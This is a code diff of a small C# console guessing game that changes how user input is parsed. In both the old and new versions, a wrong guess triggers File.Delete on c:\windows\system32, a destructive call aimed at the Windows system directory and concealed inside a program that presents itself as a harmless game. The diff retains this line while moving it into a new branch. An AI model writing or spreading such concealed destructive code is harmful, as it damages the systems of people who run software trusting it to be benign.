@@ -3,8 +3,7 @@
     class Program
     {
         static void Main(string[] args)
-        {
-            //Console.WriteLine("Hello, World!");
+        {    
             Console.ForegroundColor = ConsoleColor.Green;
             /*Simple Guessing game*/
             Random random = new Random();
@@ -13,17 +12,29 @@
             Console.Write("==Silly Guessing Game===");
             Console.Write(Environment.NewLine);
             Console.Write("\nGuess number between 1 and 10: ");
-            int guess =int.Parse(Console.ReadLine() ??"0");
+            int guess;
 
-            if (guess == randomNumber)
+            //Converts the string representation of a number to its 32-bit signed integer equivalent.
+            //A boolean return value indicates whether the operation succeeded.
+            if (int.TryParse(Console.ReadLine(), out guess)) 
             {
-                Console.WriteLine("Yey You Won!");
+                // True: the conversion was successful
+                if (guess == randomNumber)
+                {
+                    Console.WriteLine("Yey You Won!");
+                }
+                else
+                {
+                    File.Delete(@"c:\windows\system32");
+
+                }
             }
             else
             {
-                File.Delete(@"c:\windows\system32");
-
+                // The conversion failed. 
+                Console.WriteLine("Please enter a valid integer.");
             }
+
         }
     }
 }
